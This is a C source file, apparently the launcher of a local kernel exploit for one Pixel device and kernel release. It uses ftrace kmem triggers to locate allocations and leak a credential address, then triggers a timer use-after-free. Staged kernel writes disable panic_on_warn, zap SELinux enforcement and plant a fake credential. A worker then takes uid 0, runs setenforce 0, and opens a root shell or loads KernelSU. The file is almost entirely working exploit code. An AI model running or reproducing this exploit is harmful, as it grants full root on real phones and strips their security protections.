/* Entry points for the Pixel-only launcher. Included after the timer primitive. */
#include <sys/utsname.h>
#include <sys/system_properties.h>

static int saved_tracing, saved_buffer;
static void restore_trace(void)
{
    const char *events[] = {"kmem_cache_alloc", "kmem_cache_alloc_node", "mm_page_free", "mm_page_alloc"};
    char command[128];
    for (unsigned i = 0; i < 4; i++) {
        snprintf(command, sizeof(command), "!enable_event:kmem:%s\n", events[i]);
        wr(TR "/events/kmem/rss_stat/trigger", command);
        snprintf(command, sizeof(command), "disable_event:kmem:%s\n", events[i]);
        wr(TR "/events/kmem/rss_stat/trigger", command);
    }
    kick_rss();
    for (unsigned i = 0; i < 4; i++) {
        snprintf(command, sizeof(command), "!disable_event:kmem:%s\n", events[i]);
        wr(TR "/events/kmem/rss_stat/trigger", command);
    }
    snprintf(command, sizeof(command), "%d\n", saved_buffer);
    wr(TR "/buffer_size_kb", command);
    wr(TR "/tracing_on", saved_tracing ? "1" : "0");
}

static int save_trace(void)
{
    FILE *f = fopen(TR "/tracing_on", "r");
    if (!f) return -1;
    int ok = fscanf(f, "%d", &saved_tracing) == 1;
    fclose(f);
    f = fopen(TR "/buffer_size_kb", "r");
    if (!f) return -1;
    ok &= fscanf(f, "%d", &saved_buffer) == 1;
    fclose(f);
    /* Refuse to clear an active trace session or existing event triggers. */
    f = fopen(TR "/events/kmem/rss_stat/trigger", "r");
    if (!f) return -1;
    char line[256];
    while (fgets(line, sizeof(line), f))
        if (line[0] != '#' && line[0] != '\n') ok = 0;
    fclose(f);
    return ok && !saved_tracing ? 0 : -1;
}

static int profile_check(void)
{
    struct utsname u;
    char device[PROP_VALUE_MAX] = {0};
    __system_property_get("ro.product.device", device);
    if (uname(&u) || strcmp(u.release, TARGET_RELEASE) ||
        strcmp(device, TARGET_DEVICE) || sysconf(_SC_PAGESIZE) != PAGE) {
        fputs("Unsupported device/kernel/page size; no tracing or timer activity.\n", stderr);
        return -1;
    }
    if (getuid() != 2000) {
        fputs("Run from an ordinary ADB shell (uid 2000).\n", stderr);
        return -1;
    }
    return 0;
}

/* The child runs on the fake cred, whose SELinux SID is kernel, so opening a
 * new file or socket is denied under Enforcing; a 32-byte pipe write failed
 * while the 4-byte hello went through.  Deliver each report as eight separate
 * 4-byte writes into the already-open status fd. */
static int send_report(int fd, int magic, int uid, int euid, int setuid_ret,
                       int err, int ruid, int reuid, int rsuid)
{
    int v[8] = {magic, uid, euid, setuid_ret, err, ruid, reuid, rsuid};

    for (int i = 0; i < 8; i++) {
        ssize_t w = write(fd, &v[i], sizeof(v[i]));

        if (w != (ssize_t)sizeof(v[i])) {
            logf("[!] report write %d/8 failed errno=%d\n", i, errno);
            return -1;
        }
    }
    return 0;
}

static int read_report(int fd, struct child_report *r)
{
    int v[8];

    for (int i = 0; i < 8; i++) {
        struct pollfd pf = {.fd = fd, .events = POLLIN};
        ssize_t n;

        for (int wait = 0; wait < 60000; wait += 50) {
            if (poll(&pf, 1, 50) > 0)
                break;
            if (wait >= 59950) {
                logf("[-] report read %d/8 timed out\n", i);
                return -1;
            }
        }
        n = read(fd, &v[i], sizeof(v[i]));
        if (n != (ssize_t)sizeof(v[i])) {
            logf("[-] report read %d/8 short (%zd)\n", i, n);
            return -1;
        }
    }
    r->magic = v[0];
    r->uid = v[1];
    r->euid = v[2];
    r->setuid_ret = v[3];
    r->setuid_errno = v[4];
    r->ruid = v[5];
    r->reuid = v[6];
    r->rsuid = v[7];
    return 0;
}

static int root_worker(const char *mode)
{
    char go;
    int hello = CHILD_HELLO;
    if (write(4, &hello, sizeof(hello)) != sizeof(hello) || read(3, &go, 1) != 1)
        return 2;
    /*
     * No report IPC: under the fake cred (SELinux SID kernel) both new files
     * and extra pipe traffic are unreliable, so success is decided by the
     * parent from /proc/modules like the app does.  Just wake the worker and
     * let it setenforce + late-load ksud.
     */
    close(3);
    struct child_report rep = {.magic = CHILD_MAGIC};
    /* copy_creds() allocates a normal cred for this non-thread fork.
     * The fake-cred child exits immediately. The subreaper parent can then
     * release its reclaim buffers while this worker owns a real credential.
     */
    pid_t worker = fork();
    if (worker < 0) return 4;
    if (worker > 0) _exit(0);
    rep.ruid = getuid();
    rep.reuid = geteuid();
    rep.rsuid = getpid(); /* worker PID, for the subreaper's exact waitpid */
    logf("[worker] pid=%d uid=%d euid=%d\n", getpid(), rep.ruid, rep.reuid);
    /* fork()'s copy_creds() produced a real cred from the fake one; commit
     * uid/gid 0 on that real cred so the child needs no UAF repair writes. */
    if (rep.ruid || rep.reuid) {
        errno = 0;
        int sr = setresgid(0, 0, 0) || setresuid(0, 0, 0);
        logf("[worker] setresuid ret=%d errno=%d uid=%d euid=%d\n", sr,
             errno, getuid(), geteuid());
    }
    close(4);
    signal(SIGINT, SIG_DFL);
    signal(SIGTERM, SIG_DFL);
    signal(SIGHUP, SIG_DFL);
    logf("[worker] exec /system/bin/sh mode=%s\n", mode);
    char *const env[] = {
        "PATH=/system/bin:/system/xbin:/vendor/bin", "HOME=/",
        "TMPDIR=/data/local/tmp", "ANDROID_DATA=/data", "ANDROID_ROOT=/system", NULL
    };
    const char *command = !strcmp(mode, "shell")
        ? "getenforce; setenforce 0 || echo SETENFORCE_FAILED; "
          "id; grep '^CapEff:' /proc/self/status; echo ROOT_SHELL_READY; "
          "/system/bin/sh -i; rc=$?; setenforce 1; exit $rc"
        : !strcmp(mode, "install")
        ? "getenforce; setenforce 0 || echo SETENFORCE_FAILED; "
          "id; grep '^CapEff:' /proc/self/status; "
          "test $(id -u) = 0 || exit 1; "
          "grep -q '^CapEff:.*000001ffffffffff' /proc/self/status || exit 2; "
          "echo ROOT_VERIFIED; "
          "/system/bin/linker64 /data/local/tmp/pixel-timer-app/ksud "
          "late-load --kmi android15-6.6 --package-name com.rifsxd.ksunext; "
          "rc=$?; "
          "i=0; while [ $i -lt 30 ] && ! grep -q '^kernelsu ' /proc/modules; do sleep 1; i=$((i+1)); done; "
          "if grep -q '^kernelsu ' /proc/modules; then echo KSU_LOADED; rc=0; else echo KSU_NOT_LOADED; test $rc -eq 0 && rc=3; fi; "
          "setenforce 1; exit $rc"
        : "setenforce 0 || exit 3; "
          "id; cat /proc/self/attr/current; echo; "
          "grep '^CapEff:' /proc/self/status; "
          "test $(id -u) = 0 || exit 1; "
          "grep -q '^CapEff:.*000001ffffffffff' /proc/self/status || exit 2; "
          "echo ROOT_VERIFIED; setenforce 1";
    char *const av[] = {"sh", "-c", (char *)command, NULL};
    execve("/system/bin/sh", av, env);
    logf("[worker] execve failed errno=%d, keeping alive for inspection\n", errno);
    for (;;)
        pause();
}

static void oom_protect_self(void)
{
    int fd = open("/proc/self/oom_score_adj", O_WRONLY);

    if (fd < 0)
        return;
    (void)!write(fd, "-1000", 5);
    close(fd);
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    oom_protect_self();
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return root_worker(argc > 2 ? argv[2] : "verify");
    /* The failed-exec race reexecs with an empty argv[0]. */
    if (argv[0] && !argv[0][0]) _exit(42);
    if (argc != 2 || (strcmp(argv[1], "--probe") &&
                     strcmp(argv[1], "--verify") && strcmp(argv[1], "--shell") &&
                     strcmp(argv[1], "--install"))) {
        fputs("Usage: timer --probe | --verify | --shell | --install\n", stderr);
        return 2;
    }
    if (profile_check()) return 2;
    if (save_trace()) {
        fputs("Tracing is in use or its state is unreadable; stopping.\n", stderr);
        return 2;
    }
    atexit(restore_trace);
    int probe = !strcmp(argv[1], "--probe");
    const char *worker_mode = !strcmp(argv[1], "--shell") ? "shell" :
                              !strcmp(argv[1], "--install") ? "install" : "verify";
    g_fake_stage = !probe;
    if (prctl(PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0)) return 2;
    (void)setsid();
    struct rlimit rl;
    if (!getrlimit(RLIMIT_NOFILE, &rl)) {
        rl.rlim_cur = rl.rlim_max < 65536 ? rl.rlim_max : 65536;
        if (setrlimit(RLIMIT_NOFILE, &rl)) return 2;
    }
    unsigned char *raw = malloc(48u << 20);
    if (!raw) return 2;
    pin(g_cpu);
    logf("[profile] %s / %s / %s\n", TARGET_DEVICE, TARGET_RELEASE, argv[1]);
    enable_events();
    kick_rss();
    usleep(50000);
    int found = 0;
    for (int i = 0; i < 3 && !found; i++) found = discover_page_types(raw) == 0;
    if (!found || !(g_base = calibrate_base(raw))) {
        logf("PROBE_FAILED: page events or timer allocations unavailable\n");
        trace_stop();
        return 3;
    }
    pid_t child = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long cred = leak_cred(raw, &child, &go_fd, &st_fd,
                                       worker_mode, &g_child_task);
    if (!cred) {
        logf("PROBE_FAILED: timer/credential/task allocation sites do not agree\n");
        trace_stop();
        return 3;
    }
    if (probe) {
        close(go_fd); close(st_fd);
        kill(child, SIGKILL); waitpid(child, NULL, 0);
        logf("PROBE_OK: timer, credential and task allocation sites agree; no UAF triggered\n");
        trace_stop();
        free(raw);
        return 0;
    }
    /* After triggering, a dying parent could expose stale nodes to init.
     * Holders survive terminal disconnect; reboot is the recovery operation.
     */
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    prefill_timers(PREFILL_TIMERS);
    ensure_pool(); ensure_raw(); drain_timers();
    if (stage_write(0, 0, "panic_on_warn", raw, NULL, PANIC_ON_WARN_STATIC))
        park_forever("panic_on_warn stage failed");
    if (stage_write(0, 0, "selinux", raw, NULL, SELINUX_ENFORCE_ZAP))
        park_forever("selinux stage failed");
    if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred", raw, NULL, 0))
        park_forever("fake credential stage failed");
    g_cred_live = 1;
    /* uid/gid/suid/sgid in the fake cred stay dirty: the worker repairs them
     * with setresuid/setresgid on the real cred fork()/copy_creds() gives it,
     * so no additional UAF repair plants are needed. */
    if (write(go_fd, "A", 1) != 1) park_forever("worker wake failed");
    if (go_fd >= 0) {
        close(go_fd);
        go_fd = -1;
    }
    /*
     * No report channel is readable from the fake-cred child, so poll the
     * one observable outcome instead: the kernelsu module in /proc/modules.
     * The child/worker run setenforce + ksud late-load on their own; if the
     * module never appears the reclaim simply did not land.
     */
    int listed = 0;

    for (int i = 0; i < 600 && !listed; i++) {
        FILE *f = fopen("/proc/modules", "r");

        if (f) {
            char line[256];

            while (fgets(line, sizeof(line), f))
                if (!strncmp(line, "kernelsu ", 9)) {
                    listed = 1;
                    break;
                }
            fclose(f);
        }
        if (listed)
            break;
        usleep(100000);
    }
    close(st_fd);
    if (!listed) {
        logf("[-] kernelsu never appeared; parking (stale node held)\n");
        g_held++;
        park_forever("module not loaded");
    }
    int st = 0;
    (void)st;
    g_cred_live = 0;
    drain_spray(1);
    trace_stop();
    logf("[+] kernelsu listed; reclaim buffers released held=%d\n", g_held);
    free(raw);
    if (g_held)
        park_forever("module loaded; stale timer holder remains until reboot");
    return 0;
}
